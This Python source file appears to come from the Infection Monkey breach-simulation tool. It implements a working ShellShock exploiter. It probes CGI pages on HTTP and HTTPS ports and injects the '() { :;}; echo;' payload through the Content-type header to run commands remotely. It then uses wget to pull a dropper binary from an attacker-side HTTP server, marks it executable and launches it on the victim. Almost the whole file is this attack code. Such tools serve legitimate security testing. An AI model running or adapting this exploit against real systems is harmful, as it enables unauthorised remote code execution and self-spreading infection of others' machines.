# Implementation is based on shellshock script provided
# https://github.com/nccgroup/shocker/blob/master/shocker.py

import logging
import string
from random import SystemRandom

import requests

from common.utils.attack_utils import ScanStatus
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.shellshock_resources import CGI_FILES
from infection_monkey.exploit.tools.helpers import get_monkey_depth, get_target_monkey
from infection_monkey.exploit.tools.http_tools import HTTPTools
from infection_monkey.model import DROPPER_ARG
from infection_monkey.telemetry.attack.t1222_telem import T1222Telem
from infection_monkey.utils.commands import build_monkey_commandline

LOG = logging.getLogger(__name__)
TIMEOUT = 2
TEST_COMMAND = "/bin/uname -a"
DOWNLOAD_TIMEOUT = 300  # copied from rdpgrinder
LOCK_HELPER_FILE = "/tmp/monkey_shellshock"


class ShellShockExploiter(HostExploiter):
    _attacks = {"Content-type": "() { :;}; echo; "}

    _TARGET_OS_TYPE = ["linux"]
    _EXPLOITED_SERVICE = "Bash"

    def __init__(self, host):
        super(ShellShockExploiter, self).__init__(host)
        self.HTTP = [str(port) for port in self._config.HTTP_PORTS]
        safe_random = SystemRandom()
        self.success_flag = "".join(
            safe_random.choice(string.ascii_uppercase + string.digits) for _ in range(20)
        )
        self.skip_exist = self._config.skip_exploit_if_file_exist

    def _exploit_host(self):
        # start by picking ports
        candidate_services = {
            service: self.host.services[service]
            for service in self.host.services
            if ("name" in self.host.services[service])
            and (self.host.services[service]["name"] == "http")
        }

        valid_ports = [
            (port, candidate_services[f"tcp-{str(port)}"]["data"][1])
            for port in self.HTTP
            if f"tcp-{str(port)}" in candidate_services
        ]

        http_ports = [port[0] for port in valid_ports if not port[1]]
        https_ports = [port[0] for port in valid_ports if port[1]]

        LOG.info(
            f'Scanning {self.host}, ports [{",".join([str(port[0]) for port in valid_ports])}] for vulnerable CGI pages'
        )


        attackable_urls = []
        # now for each port we want to check the entire URL list
        for port in http_ports:
            urls = self.check_urls(self.host.ip_addr, port)
            attackable_urls.extend(urls)
        for port in https_ports:
            urls = self.check_urls(self.host.ip_addr, port, is_https=True)
            attackable_urls.extend(urls)
        # now for each URl we want to try and see if it's attackable
        exploitable_urls = [self.attempt_exploit(url) for url in attackable_urls]
        exploitable_urls = [url for url in exploitable_urls if url[0] is True]

        # we want to report all vulnerable URLs even if we didn't succeed
        self.exploit_info["vulnerable_urls"] = [url[1] for url in exploitable_urls]

        # now try URLs until we install something on victim
        for _, url, header, exploit in exploitable_urls:
            LOG.info(f"Trying to attack host {self.host} with {url} URL")
            # same attack script as sshexec
            # for any failure, quit and don't try other URLs
            if not self.host.os.get("type"):
                try:
                    uname_os_attack = f"{exploit}/bin/uname -o"
                    uname_os = self.attack_page(url, header, uname_os_attack)
                    if "linux" in uname_os:
                        self.host.os["type"] = "linux"
                    else:
                        LOG.info("SSH Skipping unknown os: %s", uname_os)
                        return False
                except Exception as exc:
                    LOG.debug("Error running uname os command on victim %r: (%s)", self.host, exc)
                    return False
            if not self.host.os.get("machine"):
                try:
                    uname_machine_attack = f"{exploit}/bin/uname -m"
                    uname_machine = self.attack_page(url, header, uname_machine_attack)
                    if uname_machine != "":
                        self.host.os["machine"] = uname_machine.lower().strip()
                except Exception as exc:
                    LOG.debug(
                        "Error running uname machine command on victim %r: (%s)", self.host, exc
                    )
                    return False

            # copy the monkey
            dropper_target_path_linux = self._config.dropper_target_path_linux
            if self.skip_exist and (
                self.check_remote_file_exists(url, header, exploit, dropper_target_path_linux)
            ):
                LOG.info(
                    "Host %s was already infected under the current configuration, "
                    "done" % self.host
                )
                return True  # return already infected

            src_path = get_target_monkey(self.host)
            if not src_path:
                LOG.info("Can't find suitable monkey executable for host %r", self.host)
                return False

            if not self._create_lock_file(exploit, url, header):
                LOG.info("Another monkey is running shellshock exploit")
                return True

            http_path, http_thread = HTTPTools.create_transfer(self.host, src_path)

            if not http_path:
                LOG.debug("Exploiter ShellShock failed, http transfer creation failed.")
                return False

            download_command = f"/usr/bin/wget {http_path} -O {dropper_target_path_linux};"

            download = exploit + download_command
            self.attack_page(
                url, header, download
            )  # we ignore failures here since it might take more than TIMEOUT time

            http_thread.join(DOWNLOAD_TIMEOUT)
            http_thread.stop()

            self._remove_lock_file(exploit, url, header)

            if (http_thread.downloads != 1) or (
                "ELF"
                not in self.check_remote_file_exists(
                    url, header, exploit, dropper_target_path_linux
                )
            ):
                LOG.debug(f"Exploiter {self.__class__.__name__} failed, http download failed.")
                continue

            # turn the monkey into an executable
            chmod = f"/bin/chmod +x {dropper_target_path_linux}"
            run_path = exploit + chmod
            self.attack_page(url, header, run_path)
            T1222Telem(ScanStatus.USED, chmod, self.host).send()

            # run the monkey
            cmdline = f"{dropper_target_path_linux} {DROPPER_ARG}"
            cmdline += build_monkey_commandline(
                self.host,
                get_monkey_depth() - 1,
                HTTPTools.get_port_from_url(url),
                dropper_target_path_linux,
            )
            cmdline += " & "
            run_path = exploit + cmdline
            self.attack_page(url, header, run_path)

            LOG.info(
                "Executed monkey '%s' on remote victim %r (cmdline=%r)",
                self._config.dropper_target_path_linux,
                self.host,
                cmdline,
            )

            if not (
                self.check_remote_file_exists(
                    url, header, exploit, self._config.monkey_log_path_linux
                )
            ):
                LOG.info("Log file does not exist, monkey might not have run")
                continue
            self.add_executed_cmd(cmdline)
            return True

        return False

    @classmethod
    def check_remote_file_exists(cls, url, header, exploit, file_path):
        """
        Checks if a remote file exists and returns the content if so
        file_path should be fully qualified
        """
        cmdline = f"/usr/bin/head -c 4 {file_path}"
        run_path = exploit + cmdline
        resp = cls.attack_page(url, header, run_path)
        if resp:
            LOG.info(f"File {file_path} exists on remote host")
        return resp

    def attempt_exploit(self, url, attacks=None):
        # Flag used to identify whether the exploit has successfully caused the
        # server to return a useful response

        if not attacks:
            attacks = self._attacks

        LOG.debug(f"Attack Flag is: {self.success_flag}")

        LOG.debug(f"Trying exploit for {url}")
        for header, exploit in list(attacks.items()):
            attack = f"{exploit} echo {self.success_flag}; {TEST_COMMAND}"
            result = self.attack_page(url, header, attack)
            if self.success_flag in result:
                LOG.info(f"URL {url} looks vulnerable")
                return True, url, header, exploit
            else:
                LOG.debug(f"URL {url} does not seem to be vulnerable with {header} header")
        return (False,)

    def _create_lock_file(self, exploit, url, header):
        if self.check_remote_file_exists(url, header, exploit, LOCK_HELPER_FILE):
            return False
        cmd = exploit + f"echo AAAA > {LOCK_HELPER_FILE}"
        self.attack_page(url, header, cmd)
        return True

    def _remove_lock_file(self, exploit, url, header):
        cmd = exploit + f"rm {LOCK_HELPER_FILE}"
        self.attack_page(url, header, cmd)

    @staticmethod
    def attack_page(url, header, attack):
        result = ""
        try:
            LOG.debug(f"Header is: {header}")
            LOG.debug(f"Attack is: {attack}")
            r = requests.get(  # noqa: DUO123
                url, headers={header: attack}, verify=False, timeout=TIMEOUT
            )
            result = r.content.decode()
            return result
        except requests.exceptions.RequestException as exc:
            LOG.debug(f"Failed to run, exception {exc}")
            return result

    @staticmethod
    def check_urls(host, port, is_https=False, url_list=CGI_FILES):
        """
        Checks if which urls exist
        :return: Sequence of URLs to try and attack
        """
        attack_path = "https://" if is_https else "http://"
        attack_path = attack_path + str(host) + ":" + str(port)
        reqs = []
        timeout = False
        attack_urls = [attack_path + url for url in url_list]
        for u in attack_urls:
            try:
                reqs.append(requests.head(u, verify=False, timeout=TIMEOUT))  # noqa: DUO123
            except requests.Timeout:
                timeout = True
                break
        if timeout:
            LOG.debug(
                "Some connections timed out while sending request to potentially vulnerable "
                "urls."
            )
        valid_resps = [req for req in reqs if req and req.status_code == requests.codes.ok]
        return [resp.url for resp in valid_resps]
